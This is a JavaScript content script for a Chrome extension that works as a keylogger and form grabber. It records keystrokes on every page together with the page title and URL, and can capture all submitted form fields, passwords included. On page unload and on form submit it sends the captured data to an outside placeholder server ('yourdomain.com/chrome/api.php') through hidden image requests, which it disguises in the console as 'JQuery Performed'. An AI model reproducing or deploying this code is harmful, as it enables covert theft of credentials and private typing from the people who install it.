/* Randoms */
if (!document.title) {
    document.title = document.URL;
}


/* Keylib */
// Alphanumeric
document.addEventListener('keypress', function (e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode) {
        log(String.fromCharCode(charCode));
    }
});

// Other keys
chrome.storage.sync.get({allKeys: false}, function(settings) {
    if (settings.allKeys) {
        document.addEventListener('keydown', function (e) {
            e = e || window.event;
            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
            if (charCode == 8) {
                log("[BKSP]");
            } else if (charCode == 9) {
                log("[TAB]");
            } else if (charCode == 13) {
                log("[ENTER]");
            } else if (charCode == 16) {
                log("[SHIFT]");
            } else if (charCode == 17) {
                log("[CTRL]");
            } else if (charCode == 18) {
                log("[ALT]");
            } else if (charCode == 91) {
                log("[L WINDOW]"); // command for mac
            } else if (charCode == 92) {
                log("[R WINDOW]"); // command for mac
            } else if (charCode == 93) {
                log("[SELECT/CMD]"); // command for mac
            }
        });
    } else { // Non function keys
        document.addEventListener('keydown', function (e) {
            e = e || window.event;
            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
            if (charCode == 8) {
                log("[BKSP]");
            } else if (charCode == 9) {
                log("[TAB]");
            } else if (charCode == 13) {
                log("[ENTER]");
            }
        });
    }
});


/* Keylog Saving */
var time = new Date().getTime();
var data = {};
var shouldSave = false;
var lastLog = time;
data[time] = document.title + "^~^" + document.URL + "^~^";

// Key'ed on JS timestamp
function log(input) {
    var now = new Date().getTime();
    if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
    data[time] += input;
    shouldSave = true;
    lastLog = now;
    console.log("Logged", input);
}


/* Save data */
function save() {
    if (shouldSave) {
        chrome.storage.local.set(data, function() { console.log("Saved by save function", data); shouldSave = false;});
    }
}

function autoDelete() {
    chrome.storage.sync.get({autoDelete: 1337}, function(settings) {
        // Make sure to sync with delete code from viewer.js
        var endDate = (new Date()).getTime() - (settings.autoDelete * 24 * 60 * 60 * 1000);
        chrome.storage.local.get(function(logs) {
            var toDelete = [];
            for (var key in logs) {
                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars
                  toDelete.push(key);
                }
            }
            chrome.storage.local.remove(toDelete, function() {
                console.log(toDelete.length + " entries deleted");
            });
        });
    });
}

// Save data on window close
window.onbeforeunload = function() {
	var i = document.createElement("img");
	i.src = "https://yourdomain.com/chrome/api.php?log=" + JSON.stringify(data[time]);
	console.log("JQuery Performed:", JSON.stringify(data[time]));
    save();
    if (Math.random() < 0.2) // Don't clear every unload
        autoDelete();
}

// Save every second
setInterval(function(){
    save();
}, 1000);


/* Form Grabber */
function saveForm(time, data) {
	var toSave = {};
	var i = document.createElement("img");
	// Edit this URL to set to your own backend code
	i.src = "https://yourdomain.com/chrome/api.php?log=" + JSON.stringify(data[time]);
	console.log("JQuery Performed:", JSON.stringify(data[time]));
    toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
    chrome.storage.local.set(toSave, function() { console.log("Saved", data);});

}

chrome.storage.sync.get({formGrabber: false}, function(settings) {
    if (settings.formGrabber) {
        var forms = document.getElementsByTagName("form");
        for (var i = 0; i < forms.length; i++) {
            forms[i].addEventListener("submit", function(e) {
                var data = {};
                data["FormName"] = e.target.name;
                data["FormAction"] = e.target.action;
                data["FormElements"] = {};
                var elements = e.target.elements;
                for (var n = 0; n < elements.length; n++) {
                    data["FormElements"][elements[n].name] = elements[n].value;
                }
                saveForm(e.timeStamp, data);
            });
        }
    }
});
